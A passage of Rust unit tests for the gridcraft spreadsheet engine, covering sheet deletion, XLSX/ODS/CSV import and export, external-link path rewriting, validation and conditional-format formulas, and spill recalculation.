        s.execute("cell.set", json!({"cell": "A1", "input": "=SUM(Sheet1:Sheet3!A1)"})).unwrap();
        s.execute("cell.set", json!({"cell": "B1", "input": "=Sheet1!A1"})).unwrap();
        s
    };
    let gone = Value::Error(gridcraft_core::CellError::Ref);
    for (deleted, total, direct) in [("Sheet1", 12.0, gone), ("Sheet3", 8.0, Value::Number(3.0)), ("Sheet2", 10.0, Value::Number(3.0))] {
        let mut s = book();
        s.execute("home.deleteSheet", json!({"sheet": deleted})).unwrap();
        s.execute("sheet.activate", json!({"sheet": "Results"})).unwrap();
        assert_eq!(v(&s, "A1"), Value::Number(total), "deleting {deleted}");
        assert_eq!(v(&s, "B1"), direct, "deleting {deleted}");
    }
}

#[test]
fn workbook_view_roundtrips_after_sheet_deletion_and_reordering() {
    let view = gridcraft_model::WorkbookView { show_sheet_tabs: false, show_horizontal_scroll: true, show_vertical_scroll: false, tab_ratio: 350 };
    for (initial_active, command, params, expected_order, expected_active) in [
        ("Third", "home.deleteSheet", json!({"sheet": "First"}), vec!["Second", "Third"], 1),
        ("Third", "home.deleteSheet", json!({"sheet": "Third"}), vec!["First", "Second"], 1),
        ("First", "home.deleteSheet", json!({"sheet": "Third"}), vec!["First", "Second"], 0),
        ("Third", "sheet.move", json!({"sheet": "Third", "to": 0}), vec!["Third", "First", "Second"], 0),
        ("Third", "sheet.move", json!({"sheet": "First", "to": 2}), vec!["Second", "Third", "First"], 2),
    ] {
        let mut session = s();
        session.execute("sheet.rename", json!({"name": "First"})).unwrap();
        for name in ["Second", "Third"] {
            session.execute("home.insertSheet", json!({"name": name})).unwrap();
        }
        std::sync::Arc::make_mut(&mut session.doc_mut().unwrap().wb).view = view;
        session.execute("sheet.activate", json!({"sheet": initial_active})).unwrap();
        session.execute(command, params).unwrap();

        let wb = &session.doc().unwrap().wb;
        assert_eq!(wb.active_sheet(), expected_active, "{command}");
        assert_eq!(wb.sheets.iter().map(|s| s.name.as_str()).collect::<Vec<_>>(), expected_order, "{command}");
        let (back, _) = gridcraft_xlsx::read_xlsx(&gridcraft_xlsx::write_xlsx(wb).unwrap()).unwrap();
        assert_eq!(back.sheets.iter().map(|s| s.name.as_str()).collect::<Vec<_>>(), expected_order, "{command} after reopening");
        assert_eq!(back.active_sheet(), expected_active, "activeTab follows {command}");
        assert_eq!(back.active().unwrap().name, expected_order[expected_active], "the active sheet is not a stale index");
        assert_eq!(back.view, view, "workbook display settings survive {command}");
    }
}

#[test]
fn xlsx_roundtrip_through_engine() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["a", 1], ["b", 2]]})).unwrap();
    s.execute("cell.set", json!({"cell": "B3", "input": "=SUM(B1:B2)"})).unwrap();
    let r = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
    let b64 = r["base64"].as_str().unwrap().to_string();
    s.execute("file.open", json!({"name": "x.xlsx", "base64": b64})).unwrap();
    assert_eq!(v(&s, "B3"), Value::Number(3.0));
}

fn ods_fixture() -> Vec<u8> {
    use std::io::{Cursor, Write};
    let mut zip = zip::ZipWriter::new(Cursor::new(Vec::new()));
    let options = zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);
    for (name, data) in [
        ("mimetype", "application/vnd.oasis.opendocument.spreadsheet"),
        (
            "META-INF/manifest.xml",
            r#"<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0" manifest:version="1.3"><manifest:file-entry manifest:full-path="/" manifest:media-type="application/vnd.oasis.opendocument.spreadsheet"/><manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/></manifest:manifest>"#,
        ),
        (
            "content.xml",
            r#"<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:of="urn:oasis:names:tc:opendocument:xmlns:of:1.2" office:version="1.3"><office:body><office:spreadsheet><table:table table:name="Data"><table:table-row><table:table-cell office:value-type="float" office:value="42" table:formula="of:=SUM([.B1:.B2])"/><table:table-cell office:value-type="string"><text:p>Original data</text:p></table:table-cell></table:table-row></table:table></office:spreadsheet></office:body></office:document-content>"#,
        ),
    ] {
        zip.start_file(name, options).unwrap();
        zip.write_all(data.as_bytes()).unwrap();
    }
    zip.finish().unwrap().into_inner()
}

#[test]
fn ods_import_keeps_cached_values_and_reports_limits() {
    let bytes = ods_fixture();
    assert_eq!(gridcraft_xlsx::sniff(&bytes), gridcraft_xlsx::Format::Ods);
    for name in ["source.ods", "source.xlsx"] {
        let mut s = s();
        let r = s.execute("file.open", json!({"name": name, "base64": crate::io::base64_encode(&bytes)})).unwrap();
        assert!(!r["warnings"].as_array().unwrap().is_empty());
        assert!(s.take_ui_requests().iter().any(|r| matches!(r, crate::UiRequest::Message(_))));
        assert!(s.doc().unwrap().path.is_none());
        assert!(s.doc().unwrap().display_title().ends_with(".xlsx"));
        assert_eq!(v(&s, "A1"), Value::Number(42.0));
        assert_eq!(v(&s, "B1"), Value::from("Original data"));
        assert!(s.doc().unwrap().wb.active().unwrap().cell(CellRef::parse("A1").unwrap()).unwrap().formula.is_none());
        let saved = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
        s.execute("file.open", json!({"name": "imported.xlsx", "base64": saved["base64"]})).unwrap();
        assert_eq!(v(&s, "A1"), Value::Number(42.0));
    }
}

#[test]
#[cfg(not(target_arch = "wasm32"))]
fn ods_import_never_reuses_source_as_save_target() {
    let nonce = unique_nonce();
    let dir = std::env::temp_dir().join(format!("gridcraft-ods-{}-{nonce}", std::process::id()));
    std::fs::create_dir(&dir).unwrap();
    let bytes = ods_fixture();
    for name in ["source.ods", "disguised.xlsx"] {
        let path = dir.join(name);
        std::fs::write(&path, &bytes).unwrap();
        let mut s = s();
        s.execute("file.open", json!({"path": path})).unwrap();
        s.take_ui_requests();
        s.execute("cell.set", json!({"cell": "A1", "input": "43"})).unwrap();
        s.execute("file.save", json!({})).unwrap();
        assert!(s.take_ui_requests().iter().any(|r| matches!(r, crate::UiRequest::Dialog(name, _) if name == "saveAs")));
        assert_eq!(std::fs::read(&path).unwrap(), bytes);
        assert!(s.execute("file.saveAs", json!({"path": dir.join("source.ods")})).is_err());
        assert!(s.execute("file.saveBytes", json!({"format": "ods"})).is_err());
        let output = dir.join("converted.xlsx");
        s.execute("file.saveAs", json!({"path": output})).unwrap();
        assert!(!s.doc().unwrap().is_dirty());
        assert_eq!(std::fs::read(&path).unwrap(), bytes);
        s.execute("file.open", json!({"name": "converted.xlsx", "base64": crate::io::base64_encode(&std::fs::read(output).unwrap())})).unwrap();
        assert_eq!(v(&s, "A1"), Value::Number(43.0));
    }
    std::fs::remove_dir_all(dir).unwrap();
}

/// Open a `;` CSV by path (a double-click), edit, Save: the file keeps its `;` separator.
#[test]
#[cfg(not(target_arch = "wasm32"))]
fn saving_an_opened_semicolon_csv_keeps_semicolons() {
    let nonce = unique_nonce();
    let dir = std::env::temp_dir().join(format!("gridcraft-csv-{}-{nonce}", std::process::id()));
    std::fs::create_dir(&dir).unwrap();
    let path = dir.join("cut list.csv");
    std::fs::write(&path, "1;511;184;P3_L1_led;2162PE;16;;1244121406FB\r\n1;562;510;P3_pod;2162PE;19;;124412140710\r\n").unwrap();
    let mut s = s();
    s.execute("file.open", json!({"path": path})).unwrap();
    s.execute("cell.set", json!({"cell": "B2", "input": "600"})).unwrap();
    s.execute("file.save", json!({})).unwrap();
    assert_eq!(
        std::fs::read_to_string(&path).unwrap(),
        "1;511;184;P3_L1_led;2162PE;16;;1244121406FB\r\n1;600;510;P3_pod;2162PE;19;;124412140710\r\n"
    );
    let exported = dir.join("export.csv");
    s.execute("file.exportCsv", json!({"path": exported})).unwrap();
    assert!(std::fs::read_to_string(&exported).unwrap().starts_with("1;511;184;"));
    let saved = s.execute("file.saveBytes", json!({"format": "csv"})).unwrap();
    let bytes = crate::io::base64_decode(saved["base64"].as_str().unwrap()).unwrap();
    assert!(bytes.starts_with(b"1;511;184;"));
    std::fs::remove_dir_all(dir).unwrap();
}

/// `file.exportCsv` writes displayed text by default (Excel's Save As CSV); `values: true` writes the
/// raw values for automation: full precision, ISO dates and times.
#[test]
#[cfg(not(target_arch = "wasm32"))]
fn export_csv_values_writes_raw_values_and_the_default_stays_displayed_text() {
    let mut s = s();
    for (cell, input, code) in [
        ("A1", "1234.5", "$#,##0.00"),
        ("B1", "0.123456789", "0.00"),
        ("C1", "46023", "d-mmm-yy"),
        ("D1", "46023.5", "yyyy-mm-dd hh:mm"),
        ("E1", "0.75", "h:mm"),
        ("F1", "TRUE", "General"),
        ("G1", "a,b", "General"),
        ("H1", "=1/0", "General"),
        ("I1", "1", "h:mm"),
        ("J1", "1.5", "h:mm"),
        ("K1", "46023", "yyyy-mm-dd hh:mm"),
        ("L1", "1.5", "[h]:mm"),
        ("M1", "2.5", "[>=3]yyyy-mm-dd;[<3]hh:mm"),
    ] {
        s.execute("cell.set", json!({"cell": cell, "input": input})).unwrap();
        s.execute("home.numberFormat", json!({"range": cell, "code": code})).unwrap();
    }
    #[allow(clippy::disallowed_methods)] // native-only test: a unique temp dir name
    let nonce = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos();
    let dir = std::env::temp_dir().join(format!("gridcraft-csv-values-{}-{nonce}", std::process::id()));
    std::fs::create_dir(&dir).unwrap();
    let displayed = dir.join("displayed.csv");
    s.execute("file.exportCsv", json!({"path": displayed})).unwrap();
    s.execute("file.exportCsv", json!({"path": dir.join("off.csv"), "values": false})).unwrap();
    let raw = dir.join("raw.csv");
    s.execute("file.exportCsv", json!({"path": raw, "values": true})).unwrap();
    let saved = s.execute("file.saveBytes", json!({"format": "csv"})).unwrap();
    let default = crate::io::base64_decode(saved["base64"].as_str().unwrap()).unwrap();
    // The default export is byte for byte what Save As CSV writes, and `values: false` is the default.
    assert_eq!(std::fs::read(&displayed).unwrap(), default);
    assert_eq!(std::fs::read(dir.join("off.csv")).unwrap(), default);
    let default = String::from_utf8(default).unwrap();
    assert!(default.starts_with("\"$1,234.50\",0.12,1-Jan-26,"), "{default}");
    assert_eq!(
        std::fs::read_to_string(&raw).unwrap(),
        "1234.5,0.123456789,2026-01-01,2026-01-01T12:00:00,18:00:00,TRUE,\"a,b\",#DIV/0!,00:00:00,12:00:00,2026-01-01T00:00:00,1.5,12:00:00\r\n"
    );
    std::fs::remove_dir_all(dir).unwrap();
}

/// A workbook whose B1 is `=[1]Sheet1!A1`, linked to `link` (an external relationship target).
fn linked_workbook(link: &str) -> Vec<u8> {
    use std::io::{Cursor, Write};
    const NS_REL: &str = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
    let types = r#"<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/><Override PartName="/xl/externalLinks/externalLink1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml"/></Types>"#.to_string();
    let rels = format!(
        r#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="{NS_REL}/officeDocument" Target="xl/workbook.xml"/></Relationships>"#
    );
    let book = format!(
        r#"<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="{NS_REL}"><sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets><externalReferences><externalReference r:id="rId2"/></externalReferences></workbook>"#
    );
    let book_rels = format!(
        r#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="{NS_REL}/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId2" Type="{NS_REL}/externalLink" Target="externalLinks/externalLink1.xml"/></Relationships>"#
    );
    let sheet = r#"<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1"><c r="B1"><f>[1]Sheet1!A1</f><v>10</v></c></row></sheetData></worksheet>"#.to_string();
    let link_part = format!(
        r#"<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="{NS_REL}"><externalBook r:id="rId1"><sheetNames><sheetName val="Sheet1"/></sheetNames><sheetDataSet><sheetData sheetId="0"><row r="1"><cell r="A1"><v>10</v></cell></row></sheetData></sheetDataSet></externalBook></externalLink>"#
    );
    let link_rels = format!(
        r#"<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="{NS_REL}/externalLinkPath" Target="{link}" TargetMode="External"/></Relationships>"#
    );
    let mut zip = zip::ZipWriter::new(Cursor::new(Vec::new()));
    for (name, data) in [
        ("[Content_Types].xml", types),
        ("_rels/.rels", rels),
        ("xl/workbook.xml", book),
        ("xl/_rels/workbook.xml.rels", book_rels),
        ("xl/worksheets/sheet1.xml", sheet),
        ("xl/externalLinks/externalLink1.xml", link_part),
        ("xl/externalLinks/_rels/externalLink1.xml.rels", link_rels),
    ] {
        zip.start_file(name, zip::write::SimpleFileOptions::default()).unwrap();
        zip.write_all(data.as_bytes()).unwrap();
    }
    zip.finish().unwrap().into_inner()
}

/// The target of the linked workbook in a saved file.
fn link_target(path: &std::path::Path) -> String {
    use std::io::Read;
    let mut zip = zip::ZipArchive::new(std::io::Cursor::new(std::fs::read(path).unwrap())).unwrap();
    let mut rels = String::new();
    zip.by_name("xl/externalLinks/_rels/externalLink1.xml.rels").unwrap().read_to_string(&mut rels).unwrap();
    let (_, after) = rels.split_once("Target=\"").unwrap();
    after.split_once('"').unwrap().0.to_string()
}

/// Save As into another folder keeps the link on the same file, as Excel does: the relative path
/// is rewritten from the new folder (#801).
#[test]
#[cfg(not(target_arch = "wasm32"))]
fn save_as_into_another_folder_keeps_linked_workbooks_on_the_same_file() {
    let nonce = unique_nonce();
    let a = std::env::temp_dir().join(format!("gridcraft-links-{}-{nonce}", std::process::id()));
    let b = a.join("b");
    std::fs::create_dir_all(&b).unwrap();
    let dest = a.join("Dest.xlsx");
    std::fs::write(&dest, linked_workbook("Source.xlsx")).unwrap();
    let mut s = s();
    s.execute("file.open", json!({"path": dest})).unwrap();
    s.execute("file.saveAs", json!({"path": b.join("Dest.xlsx")})).unwrap();
    assert_eq!(link_target(&b.join("Dest.xlsx")), "../Source.xlsx");
    // Saved again into the folder it was read from, the path is the one it was read with.
    s.execute("file.saveAs", json!({"path": a.join("Copy.xlsx")})).unwrap();
    assert_eq!(link_target(&a.join("Copy.xlsx")), "Source.xlsx");
    // Read from a subfolder and saved into its parent, the path goes down into the subfolder.
    let deep = b.join("Deep.xlsx");
    std::fs::write(&deep, linked_workbook("Source.xlsx")).unwrap();
    let mut s = Session::new();
    s.execute("file.open", json!({"path": deep})).unwrap();
    s.execute("file.saveAs", json!({"path": a.join("Deep.xlsx")})).unwrap();
    assert_eq!(link_target(&a.join("Deep.xlsx")), "b/Source.xlsx");
    std::fs::remove_dir_all(a).unwrap();
}

/// A typo like `report.cvs` must not quietly write an XLSX under that name and adopt it as the
/// document's file.
#[test]
#[cfg(not(target_arch = "wasm32"))]
fn saving_to_an_unknown_extension_is_refused() {
    let nonce = unique_nonce();
    let dir = std::env::temp_dir().join(format!("gridcraft-unknown-ext-{}-{nonce}", std::process::id()));
    std::fs::create_dir(&dir).unwrap();
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
    for name in ["report.cvs", "report"] {
        let path = dir.join(name);
        let e = s.execute("file.save", json!({"path": path})).unwrap_err().to_string();
        assert!(e.contains(".xlsx"), "{name}: {e}");
        assert!(!path.exists(), "{name} was written");
    }
    let d = s.doc().unwrap();
    assert!(d.path.is_none());
    assert!(d.is_dirty());
    assert!(s.execute("file.saveBytes", json!({"format": "foo"})).is_err());
    s.execute("file.save", json!({"path": dir.join("report.csv")})).unwrap();
    std::fs::remove_dir_all(dir).unwrap();
}

/// An XLSX opened by its content under an unknown extension (`budget.dat`) saves back to its own
/// file as XLSX; a Save As to another unknown extension is still refused.
#[test]
#[cfg(not(target_arch = "wasm32"))]
fn an_xlsx_opened_under_an_unknown_extension_saves_back_as_xlsx() {
    let nonce = unique_nonce();
    let dir = std::env::temp_dir().join(format!("gridcraft-dat-{}-{nonce}", std::process::id()));
    std::fs::create_dir(&dir).unwrap();
    let path = dir.join("budget.dat");
    let mut src = s();
    src.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
    std::fs::write(&path, crate::io::save_bytes(&src.doc().unwrap().wb, "book.xlsx").unwrap()).unwrap();
    let mut s = s();
    s.execute("file.open", json!({"path": path})).unwrap();
    s.execute("cell.set", json!({"cell": "A1", "input": "2"})).unwrap();
    s.execute("file.save", json!({})).unwrap();
    assert!(!s.doc().unwrap().is_dirty());
    let bytes = std::fs::read(&path).unwrap();
    assert_eq!(gridcraft_xlsx::sniff(&bytes), gridcraft_xlsx::Format::Xlsx);
    let (wb, _) = crate::io::open_bytes("book.xlsx", &bytes).unwrap();
    assert_eq!(wb.active().unwrap().value(CellRef::parse("A1").unwrap()), Value::Number(2.0));
    assert!(s.execute("file.saveAs", json!({"path": dir.join("copy.foo")})).is_err());
    assert!(!dir.join("copy.foo").exists());
    // A text file under an unknown extension opens as CSV: Save doesn't turn it into an XLSX.
    let notes = dir.join("notes.dat");
    std::fs::write(&notes, "a,b\r\n").unwrap();
    s.execute("file.open", json!({"path": notes})).unwrap();
    s.execute("cell.set", json!({"cell": "A1", "input": "c"})).unwrap();
    assert!(s.execute("file.save", json!({})).is_err());
    assert_eq!(std::fs::read_to_string(&notes).unwrap(), "a,b\r\n");
    std::fs::remove_dir_all(dir).unwrap();
}

#[test]
fn validation_formulas_are_relative_and_see_the_new_value() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "B1", "values": [[1], [100]]})).unwrap();
    s.execute("data.validation", json!({"range": "A1:A2", "type": "custom", "formula1": "=A1>10"})).unwrap();
    s.execute("data.validation", json!({"range": "C1:C2", "type": "whole", "operator": "lessOrEqual", "formula1": "=B1"})).unwrap();
    let ok = |s: &mut Session, cell: &str, input: &str| s.execute("data.validate", json!({"cell": cell, "input": input})).unwrap()["ok"] == true;
    assert!(ok(&mut s, "A1", "20"));
    assert!(!ok(&mut s, "A2", "5"));
    assert!(ok(&mut s, "C2", "50"));
    assert!(!ok(&mut s, "C1", "50"));
}

/// Every value of the active sheet as the incremental recalculation left it must equal a full one.
fn assert_matches_full_recalc(s: &Session) {
    let wb = &s.doc().unwrap().wb;
    let mut fresh = (**wb).clone();
    gridcraft_calc::Calc::new().recalc_all(&mut fresh);
    let (a, b) = (wb.active().unwrap(), fresh.active().unwrap());
    for row in 0..30 {
        for col in 0..12 {
            let cell = CellRef { row, col };
            assert_eq!(a.value(cell), b.value(cell), "{cell} in memory vs after a full recalc");
        }
    }
}

#[test]
fn filling_a_formula_next_to_a_spill_matches_a_full_recalc() {
    // Found by the command-sequence fuzzer: C14 spills along row 14; filling `=D14:E18` over
    // E13:F13 puts two array formulas whose areas run into that spill and into each other. The
    // incremental pass left F13 as #SPILL! while a full recalc gave F13 its array and C14
    // #SPILL!. The spill that already exists keeps its cells (as in Excel), in both.
    let mut s = s();
    s.execute("range.setValues", json!({"range": "B18", "values": [[1], [2], [3], [4], [5], [6], [7]]})).unwrap();
    s.execute("cell.set", json!({"cell": "C14", "input": "=TRANSPOSE(B18:B24)"})).unwrap();
    s.execute("selection.set", json!({"range": "E13"})).unwrap();
    s.execute("range.fill", json!({"range": "E13:F13", "input": "=D14:E18"})).unwrap();
    assert_eq!(v(&s, "C14"), Value::Number(1.0));
    assert_eq!(v(&s, "I14"), Value::Number(7.0));
    assert_eq!(v(&s, "F13"), Value::Error(gridcraft_core::CellError::Spill));
    assert_matches_full_recalc(&s);
}

#[test]
fn overlapping_spills_keep_the_one_that_exists_whichever_anchor_is_first() {
    use gridcraft_core::CellError::Spill;
    // E10 spills along row 10, F8 down over F10: F8 is first in reading order, E10 may be first
    // to spill. Excel keeps whichever spilled first.
    for (first, second) in [(("E10", "=SEQUENCE(1,3)"), ("F8", "=SEQUENCE(5)")), (("F8", "=SEQUENCE(5)"), ("E10", "=SEQUENCE(1,3)"))] {
        let mut s = s();
        s.execute("cell.set", json!({"cell": first.0, "input": first.1})).unwrap();
        s.execute("cell.set", json!({"cell": second.0, "input": second.1})).unwrap();
        assert_ne!(v(&s, first.0), Value::Error(Spill), "{} keeps its cells", first.0);
        assert_eq!(v(&s, second.0), Value::Error(Spill), "{} is blocked", second.0);
        assert_matches_full_recalc(&s);
        // Clearing the winner lets the other one spill.
        s.execute("edit.clearContents", json!({"range": first.0})).unwrap();
        assert_ne!(v(&s, second.0), Value::Error(Spill), "{} spills once {} is cleared", second.0, first.0);
        assert_matches_full_recalc(&s);
    }
}

#[test]
fn a_spill_growing_into_another_and_back_matches_a_full_recalc_at_every_step() {
    use gridcraft_core::CellError::Spill;
    // Both arrays already spill; F8 (first in reading order) grows down over E10's spill, is
    // #SPILL! because E10 holds those cells (as in Excel), shrinks back and spills again, then the
    // steps are undone, redone, edited inside the contested area and cleared. Every state must
    // match a full recalc.
    let mut s = s();
    s.execute("cell.set", json!({"cell": "H1", "input": "1"})).unwrap();
    s.execute("cell.set", json!({"cell": "F8", "input": "=SEQUENCE(H1)"})).unwrap();
    s.execute("cell.set", json!({"cell": "E10", "input": "=SEQUENCE(1,3)*10"})).unwrap();
    assert_eq!(v(&s, "G10"), Value::Number(30.0));
    assert_matches_full_recalc(&s);
    let steps: [(&str, serde_json::Value); 9] = [
        ("cell.set", json!({"cell": "H1", "input": "5"})),
        ("cell.set", json!({"cell": "E10", "input": "=SEQUENCE(1,2)*10"})),
        ("cell.set", json!({"cell": "H1", "input": "1"})),
        ("edit.undo", json!({})),
        ("edit.undo", json!({})),
        ("edit.redo", json!({})),
        ("cell.set", json!({"cell": "F11", "input": "x"})),
        ("cell.set", json!({"cell": "H1", "input": "2"})),
        ("edit.clearContents", json!({"range": "E8:F10"})),
    ];
    for (i, (id, params)) in steps.iter().enumerate() {
        s.execute(id, params.clone()).unwrap();
        assert_matches_full_recalc(&s);
        if i == 0 {
            // Both held a spill: E10 holds F10, so it keeps it and F8 is blocked.
            assert_eq!(v(&s, "F8"), Value::Error(Spill));
            assert_eq!(v(&s, "F10"), Value::Number(20.0));
        }
        if i == 2 {
            assert_eq!(v(&s, "E10"), Value::Number(10.0));
            assert_eq!(v(&s, "F10"), Value::Number(20.0));
        }
        if i == 3 {
            // Undone back to the grown F8, blocked again.
            assert_eq!(v(&s, "F8"), Value::Error(Spill));
            assert_eq!(v(&s, "F10"), Value::Number(20.0));
        }
        if i == 8 {
            assert_eq!((v(&s, "F8"), v(&s, "E10"), v(&s, "F9")), (Value::Empty, Value::Empty, Value::Empty));
        }
    }
}

#[test]
fn overlapping_spills_with_no_history_go_to_the_earlier_anchor() {
    use gridcraft_core::CellError::Spill;
    // A workbook calculated for the first time (a file that carries no layout) has no entry
    // order: the anchor first in reading order wins, whatever order the formulas were set in.
    for order in [["E10", "F8"], ["F8", "E10"]] {
        let mut s = s();
        for a in order {
            let input = if a == "E10" { "=SEQUENCE(1,3)" } else { "=SEQUENCE(5)" };
            s.execute("cell.set", json!({"cell": a, "input": input})).unwrap();
        }
        let mut fresh = (*s.doc().unwrap().wb).clone();
        for i in 0..fresh.sheets.len() {
            let sh = fresh.sheet_mut(i).unwrap();
            sh.spill.clear();
            sh.spill_ranges.clear();
        }
        gridcraft_calc::Calc::new().recalc_all(&mut fresh);
        let a = fresh.active().unwrap();
        let cell = |r: &str| a.value(CellRef::parse(r).unwrap());
        assert_ne!(cell("F8"), Value::Error(Spill), "order {order:?}");
        assert_eq!(cell("E10"), Value::Error(Spill), "order {order:?}");
    }
}

#[test]
fn multi_area_rule_formulas_are_relative_to_the_top_left_cell_of_all_areas() {
    // Issue #3152: Excel writes the formula for the top-left cell of all the areas (H26), whatever
    // order they are listed in, not for the first area listed (H62).
    let mut s = s();
    s.execute("range.setValues", json!({"range": "F26:F27", "values": [[4], [5]]})).unwrap();
    s.execute("data.validation", json!({"range": "H62:H68,H26:H27,H93:H95", "type": "custom", "formula1": "=MOD($H26,$F26)=0"})).unwrap();
    let ok = |s: &mut Session, cell: &str, input: &str| s.execute("data.validate", json!({"cell": cell, "input": input})).unwrap()["ok"] == true;
    assert!(ok(&mut s, "H26", "4"));
    assert!(ok(&mut s, "H26", "8"));
    assert!(!ok(&mut s, "H26", "3"));
    assert!(ok(&mut s, "H27", "10"));
    assert!(!ok(&mut s, "H27", "4"));

    // Conditional formats anchor on the same cell: `=D2>0` on D5:D6,D2:D3 checks D2 at D2.
    s.execute("range.setValues", json!({"range": "D2:D6", "values": [[1], [0], [0], [1], [0]]})).unwrap();
    s.execute("home.conditionalFormat", json!({"range": "D5:D6,D2:D3", "rule": {"type": "expression", "formula": "=D2>0", "preset": "greenFill"}}))
        .unwrap();
    let wb = s.doc().unwrap().wb.clone();
    let mut cache = crate::cf::CfCache::new();
    let mut styled = |c: &str| cache.look(&wb, 0, CellRef::parse(c).unwrap()).and_then(|l| l.style).is_some();
    assert_eq!([styled("D2"), styled("D3"), styled("D5"), styled("D6")], [true, false, true, false]);
}

#[test]
fn removing_a_rules_top_left_cell_rewrites_its_formulas_for_the_new_one() {
    let mut s = s();
    let ok = |s: &mut Session, cell: &str, input: &str| s.execute("data.validate", json!({"cell": cell, "input": input})).unwrap()["ok"] == true;
    let f1 = |s: &Session| s.doc().unwrap().wb.active().unwrap().validations[0].f1.clone();

    // One area: clearing A1 off A1:A9 leaves A2:A9, whose cells still check themselves.
    s.execute("data.validation", json!({"range": "A1:A9", "type": "custom", "formula1": "=A1>10"})).unwrap();
    s.execute("data.validation", json!({"range": "A1", "clear": true})).unwrap();
    assert_eq!(f1(&s), "A2>10");
    assert!(ok(&mut s, "A2", "20"));
    assert!(!ok(&mut s, "A2", "5"));
    s.execute("data.validation", json!({"range": "A1:A9", "clear": true})).unwrap();

    // Several areas: clearing H26 moves the top-left cell to H27, where `$H27,$F27` is checked.
    s.execute("range.setValues", json!({"range": "F26:F27", "values": [[4], [5]]})).unwrap();
    s.execute("data.validation", json!({"range": "H62:H68,H26:H27", "type": "custom", "formula1": "=MOD($H26,$F26)=0"})).unwrap();
    s.execute("data.validation", json!({"range": "H26", "clear": true})).unwrap();
    assert_eq!(f1(&s), "MOD($H27,$F27)=0");
    assert!(ok(&mut s, "H27", "10"));
    assert!(!ok(&mut s, "H27", "4"));
    // Absolute and literal formulas don't move.
    s.execute("data.validation", json!({"range": "J1:J3", "type": "list", "formula1": "=$B$1:$B$2"})).unwrap();
    s.execute("data.validation", json!({"range": "J1", "clear": true})).unwrap();
    let dv = s.doc().unwrap().wb.active().unwrap().validations.iter().find(|d| d.ranges[0].a1() == "J2:J3").unwrap().f1.clone();
    assert_eq!(dv, "$B$1:$B$2");

    // Conditional formats: Clear Rules on D2 drops the D2:D3 area, and D5:D6 keeps reading itself.
    s.execute("range.setValues", json!({"range": "D2:D6", "values": [[1], [0], [0], [0], [1]]})).unwrap();
    s.execute("home.conditionalFormat", json!({"range": "D5:D6,D2:D3", "rule": {"type": "expression", "formula": "=D2>0", "preset": "greenFill"}}))
        .unwrap();
    s.execute("range.setValues", json!({"range": "E2:E6", "values": [[1], [0], [0], [0], [1]]})).unwrap();
    s.execute("range.setValues", json!({"range": "G2:G6", "values": [[0], [9], [9], [9], [0]]})).unwrap();
    s.execute(
        "home.conditionalFormat",
        json!({"range": "E5:E6,E2:E3", "rule": {"type": "cellIs", "operator": "greater", "value": "=G2", "preset": "lightRedFill"}}),
    )
    .unwrap();
    s.execute("home.clearRules", json!({"range": "D2,E2"})).unwrap();
    let rules: Vec<gridcraft_model::CfRule> = s.doc().unwrap().wb.active().unwrap().cond_formats.iter().map(|c| c.rule.clone()).collect();
    assert!(rules.iter().any(|r| matches!(r, gridcraft_model::CfRule::Expression { formula, .. } if formula == "D5>0")), "{rules:?}");
    assert!(rules.iter().any(|r| matches!(r, gridcraft_model::CfRule::CellIs { a, .. } if a == "G5")), "{rules:?}");
    let wb = s.doc().unwrap().wb.clone();
    let mut cache = crate::cf::CfCache::new();
    let mut styled = |c: &str| cache.look(&wb, 0, CellRef::parse(c).unwrap()).and_then(|l| l.style).is_some();
    assert_eq!([styled("D5"), styled("D6"), styled("E5"), styled("E6")], [false, true, false, true]);
}

#[test]
fn samples_build() {
    for (name, _) in crate::sample::SAMPLES {
        let wb = crate::sample::build(name).unwrap_or_else(|| panic!("sample {name}"));
        assert!(!wb.sheets[0].cells.is_empty());
    }
}

/// Original minimal BIFF12 records, built in source rather than a vendor workbook fixture.
fn xlsb_fixture() -> Vec<u8> {
    use std::io::{Cursor, Write};
    fn wide(s: &str) -> Vec<u8> {
        let units: Vec<_> = s.encode_utf16().collect();
        (units.len() as u32).to_le_bytes().into_iter().chain(units.into_iter().flat_map(u16::to_le_bytes)).collect()
    }
    fn record(out: &mut Vec<u8>, id: u16, payload: &[u8]) {
        if id < 128 {
            out.push(id as u8);
        } else {
            out.extend([(id as u8 & 127) | 128, (id >> 7) as u8]);
        }
        let mut size = payload.len();
        while size >= 128 {
            out.push((size as u8 & 127) | 128);
            size >>= 7;
        }
        out.push(size as u8);
        out.extend(payload);
    }
    let mut book = vec![];
    record(&mut book, 131, &[]); // BeginBook
    record(&mut book, 143, &[]); // BeginBundleShs
    let mut bundle = vec![0; 4]; // Visible
    bundle.extend(1u32.to_le_bytes());
